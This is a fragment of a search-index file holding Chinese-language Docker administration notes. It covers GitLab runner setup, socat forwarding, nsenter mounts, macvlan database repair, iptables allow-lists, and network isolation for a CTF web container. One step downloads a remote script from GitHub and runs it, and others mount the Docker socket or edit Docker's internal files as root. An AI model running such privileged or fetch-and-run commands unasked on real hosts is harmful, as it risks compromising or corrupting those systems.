\u83b7\u53d6CI\u8fde\u63a5\u65f6\u9700\u8981\u7684token","text":"<p>\u5728\u7ba1\u7406\u5458\u754c\u9762 Overview\u4e0bRunners\u70b9\u5f00\u5373\u53ef\u770b\u5230 </p> <p>\u7f51\u5740\uff1a /admin/runners</p>"},{"location":"Docker/#_11","title":"\u7b2c\u4e09\u6b65 \u6ce8\u518c\u4ee5\u751f\u6210\u521d\u59cb\u7684\u914d\u7f6e\u4fe1\u606f","text":"<p>\u53c2\u8003https://docs.gitlab.com/runner/register/index.html#docker</p> <p>\u5047\u8bbe\u5bb9\u5668\u914d\u7f6e\u6587\u4ef6\u4fdd\u5b58\u5728/dockerfiles/gitlabrunner\u4e2d\uff0c\u5176\u4e2ddocker-image\u662f\u9ed8\u8ba4\u8dd1\u4efb\u52a1\u7684\u955c\u50cf</p> <pre><code>docker run --rm -t -i -v /dockerfiles/gitlabrunner:/etc/gitlab-runner --dns 10.0.0.1 gitlab/gitlab-runner  register  --non-interactive \\\n--url \"https://gitlab.com/\" \\\n--registration-token \"\u4e0a\u4e00\u6b65\u83b7\u5f97\u7684token\" \\\n--executor \"docker\" \\\n--docker-image myubuntu:latest \\\n--description \"docker-runner\" \\\n--run-untagged \\\n--locked=\"false\"\n</code></pre>"},{"location":"Docker/#_12","title":"\u7b2c\u56db\u6b65 \u4fee\u6539\u914d\u7f6e\u6587\u4ef6","text":"<p>\u53c2\u8003\u9ad8\u7ea7\u914d\u7f6e https://docs.gitlab.com/runner/configuration/advanced-configuration.html \u548c https://docs.gitlab.com/runner/executors/docker.html#how-pull-policies-work</p> <pre><code>cd /dockerfiles/gitlabrunner #\u4f60\u7684\u914d\u7f6e\u6587\u4ef6\u76ee\u5f55\nsudo vim config.yml\n</code></pre> <p>\u4e3a\u4e86\u8dd1\u672c\u5730\u5df2\u7ecf\u5b58\u5728\u7684\u955c\u50cf\uff08\u9ed8\u8ba4\u4e3aalways\u8868\u793a\u53ea\u80fd\u8dd1dockerhub\u4e0a\u7684\uff09\uff0c\u5728[runners.docker]\u4e2d\u9700\u8981\u6dfb\u52a0\uff1a</p> <pre><code>pull_policy = \"never\"\n</code></pre> <p>\u6216\u8005\u8fd9\u91cc\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528\u201dif-not-present\u201d \u4e0d\u5b58\u5728\u5c31pull</p> <p>\u53e6\u5916 \u5982\u679c\u9700\u8981\u4fee\u6539\u5bb9\u5668DNS\uff0c\u4e5f\u6dfb\u52a0\u8fdb\u53bb\u5373\u53ef</p> <pre><code>dns = [\"10.0.0.1\"]\n</code></pre>"},{"location":"Docker/#runner","title":"\u7b2c\u4e94\u6b65 \u542f\u52a8runner\u5bb9\u5668","text":"<p>\u5982\u679c\u9700\u8981\u6539dns\uff0c\u8fd9\u91cc\u4e5f\u522b\u5fd8\u8bb0\u5199\u4e0a</p> <pre><code>docker run -d --name gitlab-runner --restart always \\\n  -v /dockerfiles/gitlabrunner:/etc/gitlab-runner \\\n  -v /var/run/docker.sock:/var/run/docker.sock \\\n  --dns 10.0.0.1 \\\n  gitlab/gitlab-runner:latest\n</code></pre>"},{"location":"Docker/#repo","title":"\u7b2c\u516d\u6b65 \u521b\u5efa\u4e00\u4e2a\u65b0\u7684repo\u6765\u6d4b\u8bd5\u4e00\u4e0b\u5427","text":"<p>\u65b0\u5efa<code>.gitlab-ci.yml</code>\u6587\u4ef6\uff0c\u8fd9\u91cc\u4f7f\u7528\u81ea\u5df1\u7f16\u8bd1\u7684myubuntu\u955c\u50cf</p> <pre><code>image: myubuntu:latest\ntest:app:\nscript:\n- echo ok\n- curl ip.cn\n</code></pre> <p>\u7136\u540e\u5728gitlab\u7684\u4ed3\u5e93\u9875\u9762 \u6700\u65b0\u7684\u4e00\u6b21commit message\u53f3\u4fa7\u5c31\u6709CI\u6210\u529f\u4e0e\u5426\u72b6\u6001\u7684\u56fe\u6807 \u70b9\u8fdb\u53bb\u770b\u8be6\u7ec6\u65e5\u5fd7\u54af</p>"},{"location":"Docker/#socat","title":"\u4e3a\u5df2\u7ecf\u5b58\u5728\u7684\u5bb9\u5668\u521b\u5efa\u4e34\u65f6\u7aef\u53e3\u6620\u5c04 socat","text":"<p>@TAG \u7aef\u53e3\u8f6c\u53d1</p> <p>\u51fa\u4e8e\u5b66\u4e60\u76ee\u7684\uff0c\u60f3\u5feb\u901f\u5730\u5efa\u7acb\u4e00\u4e0b\u4e34\u65f6\u7684Docker\u5bb9\u5668\u7aef\u53e3\u6620\u5c04</p> <p>\u7528socat\u54af\uff1a</p> <pre><code>socat TCP4-LISTEN:9300,fork TCP4:172.17.0.3:9300\n</code></pre> <p>\u5982\u679c\u6ca1\u6709socat\uff0c\u53ef\u4ee5\uff1a</p> <pre><code>docker run -ti --rm --net host bobrik/socat TCP4-LISTEN:9300 TCP4:172.17.0.3:9300\n</code></pre>"},{"location":"Docker/#_13","title":"\u67e5\u770b\u6240\u6709\u5bb9\u5668\u5185\u5b58\u5360\u7528 \u5e76\u6392\u5e8f","text":"<p><code>docker stats</code>\u5c31\u80fd\u770b\u5230\u5b9e\u65f6\u66f4\u65b0\u7684\u7ed3\u679c\uff0c\u4f46\u5e76\u6ca1\u6709\u63d0\u4f9b\u6392\u5e8f\u529f\u80fd</p> <pre><code>docker stats --no-stream|sort -h -r -k 4,4\n</code></pre> <p>\u6392\u5e8f\u5217\u5bf9\u5e94\u5173\u7cfb\u5982\u4e0b\uff1a</p> \u5217\u53f7 \u5217\u540d 3 CPU 4 \u5185\u5b58 8 \u7f51\u7edc\u6d41\u5165 10 \u7f51\u7edc\u6d41\u51fa 11 \u6587\u4ef6\u5199\u5165 13 \u6587\u4ef6\u8bfb\u53d6 14 \u5bb9\u5668\u5185\u7ebf\u7a0b\u6570\u91cf(PID\u6570)"},{"location":"Docker/#_14","title":"\u8fd0\u884c\u4e2d\u7684\u5bb9\u5668\u6dfb\u52a0\u76ee\u5f55\u6302\u8f7d","text":"<p>Docker\u81ea\u8eab\u53ea\u5141\u8bb8\u5728\u521b\u5efa\u5bb9\u5668\u7684\u65f6\u5019\u6307\u5b9a-v\u8fdb\u884c\u76ee\u5f55\u6302\u8f7d\uff0c\u600e\u4e48\u5728\u4e0d\u505c\u6b62\u5bb9\u5668\u7684\u60c5\u51b5\u4e0b\u589e\u52a0\u6302\u8f7d\u5462\uff1f</p> <p>\u6ce8\u610f\u6b64\u65b9\u6cd5\u5728\u5bb9\u5668\u91cd\u542f\u540e\u5373\u5931\u6548\uff0c\u9700\u8981\u91cd\u65b0\u6302\u8f7d</p> <p>\u53c2\u8003\uff1ahttps://medium.com/kokster/mount-volumes-into-a-running-container-65a967bee3b5</p> <p>\u65b9\u6cd5\u662f\u628a\u5757\u8bbe\u5907\u6302\u8f7d\u5230\u5bb9\u5668\u4e2d\uff0c\u7136\u540e\u53ef\u4ee5\u4f7f\u7528bind mount</p> <p>\u5047\u8bbe\u5bb9\u5668\u540d\u79f0\u4e3aapp_container\uff0c\u9700\u8981\u6302\u8f7d/dev/sdb1\u8fd9\u4e2a\u8bbe\u5907\uff0c\u547d\u4ee4\u5982\u4e0b\uff1a</p> <p>Step1: \u9996\u5148\u8981\u67e5\u770b\u8bbe\u5907id\u4ee5\u4fbf\u5728\u5bb9\u5668\u4e2dmknod\u521b\u5efa\u8bbe\u5907\uff0c\u7136\u540e\u4f7f\u7528nsenter\u4f7f\u7528\u4e3b\u673a\u7684\u6743\u9650\u6302\u8f7d\u8bbe\u5907</p> <p>Step2: \u73b0\u5728\u5c31\u53ef\u4ee5\u5728\u5bb9\u5668\u4e2d\u4f7f\u7528/tmpmount\u8bfb\u53d6\u5230\u8bbe\u5907\u4e86\uff0c\u4f46\u5982\u679c\u6211\u4eec\u53ea\u9700\u8981\u6302\u8f7d\u5176\u4e2d\u4e00\u4e2a\u6587\u4ef6\u5939 \u4f8b\u5982\u8bbe\u5907\u7684data\u6587\u4ef6\u5939\u6302\u8f7d\u5230\u5bb9\u5668\u7684/newdata\uff0c\u8fd8\u53ef\u4ee5\u7ee7\u7eed\u6267\u884c\uff1a</p> <p>Step3: \u6700\u540e\u6e05\u7406\u6389\u4e34\u65f6\u6302\u8f7d\u7684/tmpmount \u4e0d\u4f1a\u5f71\u54cdbind mount\u6302\u8f7d\u51fa\u6765\u7684/newdata</p> <pre><code>CONTAINER_NAME=\"app_container\"\nDEVICE_NAME=\"/dev/sdb1\"\nMOUNT_SRC=\"data\"\nMOUNT_TARGET=\"/newdata\"\n\n# Step1\nx=$(grep $DEVICE_NAME /proc/self/mountinfo|cut -d ' ' -f 3)\ndocker exec -it -u root $CONTAINER_NAME sh -c \"[ -b $DEVICE_NAME ] || mknod -m 0600 $DEVICE_NAME b ${x/:/ }\"\nsudo nsenter --target \"$(docker inspect --format '{{.State.Pid}}' $CONTAINER_NAME)\" --mount --uts --ipc --net --pid --  sh -c \"mkdir -p /tmpmount;mount $DEVICE_NAME /tmpmount\"\n\n# Step2\nsudo nsenter --target \"$(docker inspect --format '{{.State.Pid}}' $CONTAINER_NAME)\" --mount --uts --ipc --net --pid -- sh -c \"mkdir -p $MOUNT_TARGET; mount -o bind /tmpmount/$MOUNT_SRC $MOUNT_TARGET\"\n\n# Step3\nsudo nsenter --target \"$(docker inspect --format '{{.State.Pid}}' $CONTAINER_NAME)\" --mount --uts --ipc --net --pid -- sh -c \"umount /tmpmount\"\n</code></pre>"},{"location":"Docker/#docker32","title":"Docker\u4f7f\u752832\u4f4d\u955c\u50cf","text":"<p>\u4f8b\u5982ubuntu16.04.5 32\u4f4d\u955c\u50cf \u4ece\u8fd9\u91cc\u4e0b\u8f7di386\u540e\u7f00\u7684<code>ubuntu-base-16.04.5-base-i386.tar.gz</code>\uff1a</p> <p>http://cdimage.ubuntu.com/ubuntu-base/releases/16.04/release/</p> <p>\u4e0b\u8f7d\u4e86\u4e4b\u540e\u76f4\u63a5\u4ea4\u7ed9docker\u5bfc\u5165\u5373\u53ef\uff1adocker import \u6587\u6863</p> <pre><code>cat ubuntu-base-16.04.5-base-i386.tar.gz|docker import - ubuntu1604_32bit\n</code></pre>"},{"location":"Docker/#varlibdocker","title":"\u627e\u5230/var/lib/docker\u4e2d\u5bb9\u5668\u7684\u6570\u636e\u5b58\u50a8\u76ee\u5f55","text":"<p>\u4f7f\u7528docker-backup:</p> <pre><code>curl -Lo /usr/local/bin/docker-backup https://raw.githubusercontent.com/vincepare/docker-backup/master/docker-backup.sh &amp;&amp; chmod +x /usr/local/bin/docker-backup\n\ndocker-backup ls -w container\n</code></pre> <p>\u4e3e\u4e2a\u4f8b\u5b50 Apache\u5bb9\u5668\u7531\u4e8e/tmp/httpd_lua_shm.1\u7684\u5b58\u5728\u8dd1\u4e0d\u8d77\u6765\uff0c\u8bd5\u8bd5\u76f4\u63a5\u5220\u9664\u5bb9\u5668\u5185\u7684\u8fd9\u4e2a\u6587\u4ef6</p> <pre><code>for i in `d ps -a|grep Exit|grep minutes|awk '{print $1}'`; do rm `docker-backup ls -w $i`/tmp/httpd_lua_shm.1; d start $i ; done\n</code></pre>"},{"location":"Docker/#dockermacvlan","title":"\u642c\u8fd0\u670d\u52a1\u5668\u540e\u7f51\u6bb5\u53d8\u5316 \u76f4\u63a5\u4fee\u6539Docker\u5e95\u5c42\u6570\u636e\u5e93\u548c\u914d\u7f6e\u6587\u4ef6\u4fee\u590dmacvlan\u7f51\u7edc","text":"<p>\u9700\u6c42\uff1a\u670d\u52a1\u5668\u673a\u623f\u642c\u8fc1\uff0c\u4ece10.214.10.x\u53d8\u4e3a10.214.160.x\uff0c\u914d\u7f6e\u7684macvlan\u5bb9\u5668\u5c31\u4e0d\u80fd\u8bbf\u95ee\u4e86</p> <p>Docker\u6ca1\u6709\u63d0\u4f9b\u4fee\u6539\u7f51\u7edc\u914d\u7f6e\u7684\u65b9\u6cd5\uff0c\u6211\u4eec\u5c31\u76f4\u63a5\u6539Docker\u7684\u6570\u636e\u5e93\u548c\u914d\u7f6e\u6587\u4ef6\u5457</p> <p>\u4e0d\u8fd9\u6837\u76f4\u63a5\u6539\u5e95\u5c42\u6587\u4ef6\u4e5f\u662f\u53ef\u4ee5\u7684\uff0c\u9700\u8981\u5148disconnect\u65e7\u7684macvlan\u6240\u6709\u5bb9\u5668\uff0c\u7136\u540e\u5220\u6389\u91cd\u5efa\u8fd9\u4e2anetwork\uff0c\u518d\u4e00\u4e2a\u4e2a\u52a0\u56de\u6765</p> <p>\u7f51\u7edc\u914d\u7f6e\u7684\u6570\u636e\u5e93\u5728<code>/var/lib/docker/network/files/local-kv.db</code>\uff0c\u672c\u8d28\u4e0a\u662fboltdb\uff0c\u9700\u8981\u4f7f\u7528docker\u7684libkv\u6765\u8fdb\u884c\u8bbf\u95ee</p> <p>\u6ce8\u610f\u5230ip\u524d\u7f00\u7684\u957f\u5ea6\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u76f4\u63a5sed\u662f\u4e0d\u884c\u7684\uff0c\u4f1a\u635f\u574f\u6570\u636e\u5e93\uff08\u5982\u679c\u957f\u5ea6\u6ca1\u53d8\u53ef\u4ee5\u76f4\u63a5sed\uff09\uff0c\u64cd\u4f5c\u524d\u8bb0\u5f97\u5907\u4efd</p> <p>\u53c2\u8003 https://blog.qiqitori.com/?p=463</p> <p>\u52a0\u4ee5\u4fee\u6539\uff0c\u9700\u8981\u5728<code>docker pull golang:1.8</code>\u4e2d\u7f16\u8bd1\u8fd0\u884c</p> <pre><code>package main\n\nimport (\n    \"time\"\n    \"log\"\n    \"strings\"\n    \"github.com/docker/libkv\"\n    \"github.com/docker/libkv/store\"\n    \"github.com/docker/libkv/store/boltdb\"\n)\n\nfunc init() {\n    // Register boltdb store to libkv\n    boltdb.Register()\n}\n\nfunc main() {\n    client := \"./local-kv.db\" // ./ appears to be necessary\n\n    // Initialize a new store\n    kv, err := libkv.NewStore(\n        store.BOLTDB, // or \"boltdb\"\n        []string{client},\n        &amp;store.Config{\n            Bucket: \"libnetwork\",\n            ConnectionTimeout: 10*time.Second,\n        },\n    )\n    if err != nil {\n        log.Fatalf(\"Cannot create store: %v\", err)\n    }\n\n    pair, err := kv.List(\"docker/network\")\n    for _, p := range pair {\n        println(\"key:\", string(p.Key))\n        val := strings.Replace(string(p.Value), \"10.214.10.\", \"10.214.160.\", -1)\n        println(\"value:\", val)\n        err = kv.Put(p.Key, []byte(val), nil)\n    }\n}\n</code></pre> <p>\u5176\u4e2d\u9700\u8981\u6ce8\u610fgolang1.8\u7684strings\u6ca1\u6709ReplaceAll\u65b9\u6cd5\uff1bstring\u8f6cbytes\u6570\u7ec4\u7528<code>[]byte(...)</code>\u5373\u53ef\uff1b<code>println</code>\u4e0d\u662ffmt\u5e93\u7684\uff0c\u662f\u5f80stderr\u8f93\u51fa\u7684</p> <p>\u9664\u4e86\u7f51\u7edc\u6570\u636e\u5e93\u8fd8\u9700\u8981\u4fee\u6539\u5bb9\u5668\u7684.json\u914d\u7f6e\u6587\u4ef6\uff1a<code>/var/lib/docker/containers/*/*.json</code></p> <pre><code>sed -i 's/10.214.10./10.214.160./g' /var/lib/docker/containers/*/*.json\n</code></pre> <p>\u7136\u540e\u5c31\u80fd\u542f\u52a8docker\u4e86\uff0c\u5982\u679c\u6709\u5bb9\u5668\u7684\u5f53\u524dip\u5df2\u7ecf\u88ab\u5176\u4ed6\u8bbe\u5907\u5360\u7528\uff0c\u53ef\u4ee5\u901a\u8fc7\u8131\u79bb\u7f51\u7edc\u518d\u52a0\u5165\u6765\u4fee\u6539ip</p> <pre><code>docker network disconnect macvlan_name container_name\ndocker network connect macvlan_name container_name --ip \u65b0\u7684ip\n</code></pre> <p>\u5982\u679c\u65b0\u7684ip\u8fd8\u662fping\u4e0d\u4e86\uff0c\u8bd5\u8bd5\u91cd\u542f\u5bb9\u5668</p>"},{"location":"Docker/#2","title":"\u83b7\u53d62\u4e2a\u6708\u524d\u9000\u51fa\u7684\u5bb9\u5668\u5217\u8868\uff0c\u4ee5\u7a7a\u683c\u5206\u9694","text":"<pre><code>docker ps -a --format '{{.Names}} {{.Status}}'|grep \"2 month\"|awk '{print $1}'|tr '\\r\\n' ' '\n</code></pre>"},{"location":"Docker/#ping-ipnsenter","title":"\u5bb9\u5668\u5185\u6ca1\u6709ping, ip\uff1f\u76f4\u63a5nsenter\u8fdb\u53bb\u770b\u770b","text":"<pre><code>netin(){\n    nsenter --target `docker inspect --format '{{.State.Pid}}' $1`  --net --pid /bin/bash\n}\n</code></pre> <p>\u8fd9\u662f\u8fdb\u5165docker\u5bb9\u5668\u7684namespace\uff0c\u4f46\u53ea\u5207\u6362\u7f51\u7edc\u548c/proc\uff0c\u6587\u4ef6\u7cfb\u7edf\u7b49\u8fd8\u662f\u4f7f\u7528\u4e3b\u673a\u7684</p> <p>\u8fdb\u5165\u540ebash\u4f3c\u4e4e\u6ca1\u53d8\uff0c\u8fd9\u65f6\u53ef\u4ee5ps\u770b\u770b\u8fdb\u7a0b\u5217\u8868\u53d8\u4e86\u5c31\u8bf4\u660e\u5728\u5bb9\u5668\u91cc\u9762\u4e86\uff0c\u7136\u540e\u53ef\u4ee5\u6109\u5feb\u5730ifconfig\u548cping\u4e86</p> <p>\u4e5f\u53ef\u4ee5\u4f7f\u7528ip\u547d\u4ee4\u6307\u5b9anetns\u7684\u65b9\u5f0f<code>ip netns exec \u540d\u79f0 \u547d\u4ee4</code></p> <pre><code>#!/bin/bash\nNAME=\"container name\"\nmkdir -p /var/run/netns\nID=`docker inspect --format='{{ .State.Pid }}' $NAME`\nsudo ln -sf \"/proc/$ID/ns/net\" /var/run/netns/$NAME\nexec sudo ip netns exec $NAME \"$@\"\n</code></pre>"},{"location":"Docker/#macvlanip_2","title":"\u4e3amacvlan\u7684\u5bb9\u5668\u914d\u7f6e\u53ea\u5141\u8bb8IP\u6bb5\u8bbf\u95ee","text":"<p>\u5c06\u5bb9\u5668\u66b4\u9732\u5728\u6574\u4e2a\u5185\u7f51\u8fd8\u662f\u4e0d\u591f\u5b89\u5168\uff0c\u4e0d\u5982\u4f7f\u7528iptables\u53ea\u5141\u8bb8\u7279\u5b9aIP\u6bb5\u8bbf\u95ee\u8fd9\u4e2a\u5bb9\u5668\u7684IP</p> <p>\u6309\u4e0a\u8ff0\u64cd\u4f5c\u4e4b\u540e\uff0c\u5047\u8bbe\u5bb9\u5668\u540d\u79f0\u4e3aname\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5148\u5efa\u7acb\u4e00\u4e2aalias\u6765\u5feb\u901fiptables:</p> <p>\u53c2\u8003\uff1a https://unix.stackexchange.com/questions/11851/iptables-allow-certain-ips-and-block-all-other-connection</p> <pre><code>alias i=\"sudo ip netns exec name iptables\"\ni -P FORWARD DROP # we aren't a router\ni -A INPUT -m state --state INVALID -j DROP\ni -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT\ni -A INPUT -i lo -j ACCEPT\ni -A INPUT -s 10.0.0.1/24 -j ACCEPT\ni -A INPUT -s 172.19.0.1/24 -j ACCEPT\ni -P INPUT DROP # Drop everything we don't accept\n</code></pre> <p>\u6548\u679c\u5c31\u662f\u53ea\u6709\u5185\u7f5110.0.0.1-10.0.0.254\u7684ip\u624d\u80fd\u8bbf\u95ee\u8fd9\u4e2a\u5bb9\u5668\u7684IP\uff0c\u5176\u4ed6\u6765\u6e90\u90fd\u4e0d\u80fdping\u901a\u8fd9\u4e2a\u5bb9\u5668</p> <p>\u4e0b\u9762\u7684bash\u811a\u672c\u4f1a\u81ea\u52a8\u5bf9\u5bb9\u5668\u7684\u6240\u6709IP\u6bb5\u5141\u8bb8\u8bbf\u95ee\uff0c\u5e76\u62d2\u7edd\u5176\u4ed6\u8bbf\u95ee\uff1a</p> <p>\u5176\u4e2d\u7684docker inspect\u547d\u4ee4\u53ef\u4ee5\u83b7\u53d6\u5bb9\u5668\u62e5\u6709\u7684\u6240\u6709IP</p> <pre><code>#!/bin/bash\nset -ex\nDOCKERNAME=\"xxx\"\nNAME=\"xx\"\n\nshopt -s expand_aliases\nsudo mkdir -p /var/run/netns\nID=`docker inspect --format='{{ .State.Pid }}' ${DOCKERNAME}`\nsudo ln -sf \"/proc/$ID/ns/net\" /var/run/netns/${NAME}\nalias i=\"sudo ip netns exec ${NAME} iptables\"\ni -F\ni -P FORWARD DROP # we aren't a router\ni -A INPUT -m state --state INVALID -j DROP\ni -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT\ni -A INPUT -i lo -j ACCEPT\n\ndocker inspect --format='{{range .NetworkSettings.Networks}}{{.IPAddress}}{{\"\\n\"}}{{end}}' ${DOCKERNAME}|xargs -i sudo ip netns exec ${NAME} iptables -A INPUT -s '{}/24' -j ACCEPT\ni -P INPUT DROP # Drop everything we don't accept\n</code></pre>"},{"location":"Docker/#varlibdocker_1","title":"\u4ece/var/lib/docker\u63d0\u53d6\u5bb9\u5668\u5f00\u59cb\u65f6\u95f4","text":"<p>\u8bfb\u53d6/var/lib/docker/containers/*/config.v2.json\u53ef\u4ee5\u8bfb\u5230\u5bb9\u5668\u5f00\u59cb\u65f6\u95f4</p> <p>\u4f46\u4f7f\u7528\u540c\u4e00\u4e2a\u6587\u4ef6\u5939\u4e0bhostname\u8fd9\u4e2a\u6587\u4ef6\u7684\u65f6\u95f4\u6233\u66f4\u53ef\u9760\uff0c\u65e0\u9700\u8003\u8651\u65f6\u533a\u6362\u7b97\u4e0d\u540c\u670d\u52a1\u5668\u65f6\u95f4\u4e0d\u540c\u6b65\u7b49\u95ee\u9898\u3002\u8ba1\u7b97\u6587\u4ef6\u4ea7\u751f\u7684\u76f8\u5bf9\u65f6\u95f4\u7528os.path.getmtime(\u8fd9\u4e2a\u6587\u4ef6)\u51cf\u53bb\u8fd9\u4e2a\u65f6\u95f4\u6233\u5373\u53ef\u3002</p> <p>\u5bfc\u5165\u5230mysql \u5b8c\u6574\u4ee3\u7801\uff1a \u6267\u884c\u7684\u65f6\u5019\u9700\u8981server name\u4f5c\u4e3a\u53c2\u6570</p> <pre><code>from bugid import runsql\nimport os,sys,glob,json\nimport datetime\nimport re\nserver = sys.argv[1]\nos.chdir(\"/var/lib/docker/containers\")\nsql = \"replace into dockers(server, name, id, starttime, runningtime, memlimit) values \"\nsqlpending = []\nt = 0\nfor i in glob.glob(\"*/\"):\n    if not os.path.exists(i+\"hostname\"):\n        #print(i)\n        continue\n    data = json.loads(open(i+\"config.v2.json\").read())\n    name = data[\"Name\"]\n    starttime = data[\"State\"][\"StartedAt\"]\n    endtime = data[\"State\"][\"FinishedAt\"]\n    if endtime != \"0001-01-01T00:00:00Z\":\n        runningtime = (datetime.datetime.strptime(endtime.split(\".\")[0], \"%Y-%m-%dT%H:%M:%S\") - datetime.datetime.strptime(starttime.split(\".\")[0], \"%Y-%m-%dT%H:%M:%S\")).total_seconds()\n    else:\n        runningtime = -1\n    memlimit = int(json.load(open(i+\"hostconfig.json\"))[\"Memory\"]/1024/1024)\n    sqlpending.extend([server, name[1:], i[:-1], int(os.path.getmtime(i+\"hostname\")), runningtime, memlimit])\n    sql += \"(%s, %s, %s, %s, %s, %s),\"\n\n#print(sqlpending)\nrunsql(sql[:-1], *sqlpending)\n</code></pre>"},{"location":"Docker/#ip_1","title":"\u56fa\u5b9a\u5bb9\u5668\u7684IP","text":"<p>\u53c2\u8003\uff1a https://github.com/johnnian/Blog/issues/16</p> <p>\u9ed8\u8ba4\u7684bridge\u7f51\u7edc\u4e0d\u652f\u6301\u6307\u5b9aip\uff0c\u9700\u8981\u518d\u521b\u5efa\u4e00\u4e2a\u7f51\u7edc\uff1a</p> <pre><code>docker network create --subnet=172.18.0.0/16 b\n</code></pre> <p>\u521b\u5efa\u5bb9\u5668\u7684\u65f6\u5019\u53ef\u4ee5<code>--network b --ip 172.18.0.2</code></p> <p>\u5df2\u7ecf\u5b58\u5728\u7684\u5bb9\u5668\u9700\u8981\u7528\uff1a</p> <pre><code>docker network connect --ip 172.18.0.2 --alias ${name} b ${name}\n</code></pre> <p>\u4e0d\u60f3\u6539\u52a8docker\u7684network\u8fd8\u6709\u4e2a\u4e34\u65f6\u7684\u529e\u6cd5\uff1a</p>"},{"location":"Docker/#ip-etchosts","title":"\u83b7\u53d6\u5bb9\u5668IP \u66f4\u65b0\u4e3b\u673a/etc/hosts","text":"<p>\u9700\u8981\u5148\u5c06\u5f53\u524d\u7684hosts\u6587\u4ef6\u590d\u5236\u4e3a/etc/hosts.base</p> <p>\u5176\u4e2dbridge\u53ef\u80fd\u9700\u8981\u6539\u6210docker inspect\u8f93\u51fa\u7684\u5176\u4ed6network\u540d\u79f0</p> <pre><code>#!/bin/bash\nif [[ $EUID -ne 0 ]]; then\necho \"This script must be run as root\"\nexit 1\nfi\ncp /etc/hosts.base /etc/hosts\necho `docker inspect ${name} --format '{{.NetworkSettings.Networks.bridge.IPAddress}}'`  ${name} &gt;&gt; /etc/hosts\n</code></pre> <p>\u53e6\u5916 \u4f60\u8fd8\u53ef\u4ee5\u542f\u52a8\u4e2adns\u670d\u52a1\u7684\u5bb9\u5668\u6765\u89e3\u6790\u5bb9\u5668hostname:</p> <p>https://stackoverflow.com/questions/37242217/access-docker-container-from-host-using-containers-name/45071126#45071126</p>"},{"location":"Docker/#docker-web","title":"Docker\u5bb9\u5668\u7981\u6b62\u4e3b\u52a8\u8054\u7f51 \u4f46\u5bf9\u5916\u63d0\u4f9bweb\u670d\u52a1","text":"<p>@TAG \u7aef\u53e3\u6620\u5c04 ctf</p> <p>\u9996\u5148\u6392\u9664<code>--network none</code>\uff0c\u8fd9\u6837\u6ca1\u6709\u7f51\u5361\u600e\u4e48\u505a\u7aef\u53e3\u6620\u5c04</p> <p>\u4e0b\u9762\u5047\u8bbe\u5bb9\u5668\u540d\u79f0\u4e3a<code>${CONTAINER}</code>\uff0c\u5bb9\u5668\u542f\u52a8\u7684http\u670d\u52a1\u7aef\u53e3\u4e3a5000</p>"},{"location":"Docker/#_15","title":"\u7b80\u5355\u65b9\u6848 \u76f4\u63a5\u5220\u9664\u9ed8\u8ba4\u8def\u7531","text":"<pre><code>nsenter --target `docker inspect --format '{{.State.Pid}}' ${CONTAINER}`  --net --pid route delete default\n</code></pre> <p>\u597d\u5904\u5728\u4e8e\u8bbf\u95ee\u7f51\u7edc\u7684\u8bf7\u6c42\u80fd\u8fc5\u901f\u62a5\u9519<code>Network is unreachable</code>\uff0c\u4e5f\u4e0d\u9700\u8981\u989d\u5916\u7684\u5bb9\u5668\u53c2\u6570\u914d\u7f6e</p> <p>\u4f46\u5bb9\u5668\u6bcf\u6b21\u91cd\u542f\u90fd\u9700\u8981\u91cd\u65b0\u6267\u884c</p>"},{"location":"Docker/#nginx","title":"\u590d\u6742\u65b9\u6848 \u521b\u5efa\u4e2a\u5185\u90e8\u7f51\u7edc Nginx\u8f6c\u53d1","text":"<p>docker\u7684\u521b\u5efa\u7f51\u7edc\u63d0\u4f9b\u4e86<code>--internal</code>\u53c2\u6570\uff0c\u610f\u601d\u662f\u4e0d\u5141\u8bb8\u8fd9\u4e2a\u7f51\u7edc\u8bbf\u95ee\u5916\u754c\uff0c\u4f46\u662f\u8bbf\u95ee\u7f51\u7edc\u7684\u8bf7\u6c42\u4e0d\u4f1a\u7acb\u523b\u8fd4\u56de\uff0c\u6548\u679c\u50cf\u662f\u4e00\u76f4\u4e22\u5305\u5c31\u6ca1\u54cd\u5e94</p> <p>\u8fd9\u91cc\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a<code>${CONTAINER}_nonet</code>\u7684\u7f51\u7edc\uff0c\u542f\u52a8\u5bb9\u5668\u7684\u65f6\u5019\u6307\u5b9a\u8fd9\u4e2a\u7f51\u7edc\u5e76\u914d\u7f6e\u522b\u540dapp</p> <p>\u7136\u540e\u8fd8\u9700\u8981Nginx\u5bb9\u5668\u540c\u65f6\u52a0\u5165\u9ed8\u8ba4\u7f51\u7edc\u548c\u8fd9\u4e2a\u7f51\u7edc\u6765\u8fdb\u884c\u8f6c\u53d1\uff0cNginx\u5bb9\u5668\u4e00\u5f00\u59cb\u521b\u5efa\u540e\u7684\u542f\u52a8\u4f1a\u62a5\u9519\u53cd\u590d\u91cd\u542f\uff08\u65e0\u6cd5\u89e3\u6790app\uff09\uff0c\u52a0\u5165\u7f51\u7edc\u540e\u5373\u53ef\u6b63\u5e38\u542f\u52a8</p> <pre><code>docker network create ${CONTAINER}_nonet --internal\ndocker run --network ${CONTAINER}_nonet --network-alias app ...\ndocker run --name ${CONTAINER}_nginx -d -v `pwd`/nginxconf:/etc/nginx/conf.d -p 20528:80 --restart=always nginx\ndocker network connect ${CONTAINER}_nonet ${CONTAINER}_nginx --alias nginx\n</code></pre> <p>\u5176\u4e2dnginxconf\u6587\u4ef6\u5939\u91cc\u653e\u4e00\u4e2adefault.conf:</p> <pre><code>server {\nlisten       80;\nserver_name  localhost;\nlocation / {\nproxy_pass http://app:5000;\nproxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n}\n}\n</code></pre> <p>\u65e2\u7136\u7528\u4e86\u53cd\u5411\u4ee3\u7406\uff0c\u5e94\u7528\u5c42\u4e5f\u9700\u8981\u914d\u7f6e\u4e00\u4e0bIP\u76f8\u5173\u7684\u4fee\u590d\u624d\u80fd\u4f7f\u65e5\u5fd7\u663e\u793a\u8bbf\u95ee\u8005ip\uff08\u800c\u4e0d\u662fNginx\u5bb9\u5668\u7684IP\uff09\uff0c\u6bd4\u5982Flask 1.0\u9700\u8981\uff1a</p> <pre><code>from werkzeug.middleware.proxy_fix import ProxyFix\napp.wsgi_app = ProxyFix(app.wsgi_app)\n</code></pre> 